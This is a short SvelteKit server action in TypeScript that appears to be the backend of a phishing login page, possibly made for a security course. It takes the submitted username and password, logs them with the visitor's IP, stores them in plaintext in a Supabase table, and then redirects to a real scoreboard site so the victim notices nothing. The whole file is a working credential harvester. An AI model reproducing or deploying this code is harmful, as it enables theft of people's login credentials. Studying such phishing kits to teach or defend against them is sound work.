// @ts-nocheck
import { fail, redirect } from "@sveltejs/kit";
import { requestIp } from "../../hooks.server";
import { supabase } from "$lib/supabaseClient";

export const actions = {
    default: async ({ request }) => {
        const data = await request.formData();
        const username = data.get("username");
        const password = data.get("password");

        console.log(requestIp, username, password);

        const { error } = await supabase.from("users").insert({
            ip: requestIp,
            username: username,
            password: password
        });

        if (error && error?.status != 201) {
            return fail(400, {
                message: "Error logging in"
            });
        }

        throw redirect(307, "https://iik3100.hackingarena.no/scoreboard");
    }
};
